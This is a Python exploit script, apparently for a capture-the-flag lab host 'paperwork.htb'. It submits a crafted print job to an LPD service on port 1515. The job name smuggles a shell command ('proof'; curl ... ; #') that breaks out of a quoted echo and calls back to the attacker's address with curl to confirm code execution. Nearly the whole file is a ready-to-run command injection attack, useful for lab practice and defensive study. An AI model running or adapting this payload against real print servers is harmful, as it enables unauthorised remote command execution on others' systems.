#!/usr/bin/env python3

import socket


TARGET = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"

# Your Kali tun0 VPN address
LHOST = "10.10.14.38"
LPORT = 8000


def recv_ack(sock: socket.socket, stage: str) -> None:
    response = sock.recv(1)

    if response == b"\x00":
        print(f"[+] {stage} accepted")
    else:
        raise RuntimeError(
            f"[-] {stage} rejected: {response!r}"
        )


# Break out of the single-quoted echo command, execute curl,
# then comment out the remainder of the original command.
job_name = (
    f"proof'; "
    f"curl -s http://{LHOST}:{LPORT}/lpd-command-executed; "
    f"#"
)

control_file = (
    "Hkali\n"
    "Pkali\n"
    f"J{job_name}\n"
).encode()

print(f"[*] Target: {TARGET}:{PORT}")
print(f"[*] Queue: {QUEUE}")
print(f"[*] Control-file size: {len(control_file)} bytes")

with socket.create_connection(
    (TARGET, PORT),
    timeout=10,
) as sock:

    # LPD command 0x02: receive print job
    sock.sendall(
        b"\x02"
        + QUEUE.encode()
        + b"\n"
    )
    recv_ack(sock, "Queue")

    # LPD subcommand 0x02: receive control file
    header = (
        b"\x02"
        + str(len(control_file)).encode()
        + b" cfA001kali\n"
    )

    sock.sendall(header)
    recv_ack(sock, "Control-file header")

    # Control-file content followed by a null terminator
    sock.sendall(control_file + b"\x00")

    # The custom server sends acknowledgement bytes after processing.
    try:
        sock.settimeout(3)
        responses = sock.recv(2)
        print(f"[+] Final response: {responses!r}")
    except socket.timeout:
        print("[*] No final acknowledgement received")

print("[+] Job submitted")
